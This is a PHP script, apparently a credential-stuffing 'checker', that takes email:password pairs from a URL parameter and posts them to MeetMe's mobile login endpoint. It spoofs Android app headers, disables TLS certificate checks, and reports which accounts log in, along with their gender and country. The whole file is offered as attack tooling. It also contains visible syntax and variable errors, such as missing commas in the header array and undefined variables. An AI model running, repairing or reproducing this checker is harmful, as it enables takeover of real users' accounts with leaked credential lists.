<?php


error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$email = multiexplode(array(":", "|", "/", " "), $lista)[0];
$pass = multiexplode(array(":", "|", "/", " "), $lista)[1];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
 
///1st REQ///
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://ssl.meetme.com/mobile/login');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'Host: ssl.meetme.com',
   'Accept: application/json',
   'Accept-Language: en-US,en;q=0.9',
   'Content-Type: application/x-www-form-urlencoded',
   'x-device: android,8950f4f0-6dd5-4318-896a-ffccd422490a,3110:3110',
   'x-counts: 0'
   'x-notificationtypes: friendAccept,newMatch,boostChat,smileSent,newMemberAlert'
   'x-supportedfeatures: messageStickers,StackedNotifications:v6,tags,twoStepRegistration,chatSuggestions,purchaseRevamp,registrationSingleNameLabelsInFields,strictHttps,realtimeAtLogin,meetQueueSayHi,registrationTestValidation,MediaLinkMessages:v1,liveVideo,SurfaceChat:v1,chatGiftMessage,faceVerification,requestInbox,perimeterX:v1,photoLikeMessage:v2,chatTopPicksMessage'
   'x-stats: {\"events\":{\"screens\":{\"LoginActivity\":{\"viewed\":1}}},\"memTotal\":201326592,\"memUsed\":15572728,\"methods\":[{\"callback\":0.0,\"key\":\"states\",\"parse\":0.003,\"roundTrip\":0.356},{\"callback\":0.0,\"key\":\"states\",\"parse\":0.003,\"roundTrip\":0.386},{\"callback\":0.0,\"key\":\"states\",\"parse\":0.002,\"roundTrip\":0.336}]}',
   'user-agent: okhttp/3.12.13'));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_POSTFIELDS, "emailId=$email&password=$pass&fbAccessToken=&deviceVerifications=&lat=&long=&systemInfo=&sessionId=&sessionState=1&rememberMe=&skipResponseKeys=");
 $result1 = curl_exec($ch);
 $error = trim(strip_tags(getStr($result1,'"error": "','"')));
 $errorType = trim(strip_tags(getStr($result1,'"errorType": "','"')));
 $country = trim(strip_tags(getStr($result1,'"country": "','"')));
 $gender = trim(strip_tags(getStr($result1,'"gender": "','"')));
 $level = trim(strip_tags(getStr($result1,'"level": "','"')));

///Final Stage///
  
if($error == null) {
echo '{"res":"Logged IN[PASS]✅","gender":"'.$gender.'","country":"'.$country.'","popularity":"'.$popularity.'"}';
}
else{
echo '{"res":"Login Faild❌","Error Type":"'.$errorType.'"}';
}
curl_close($ch);
ob_flush();

?>
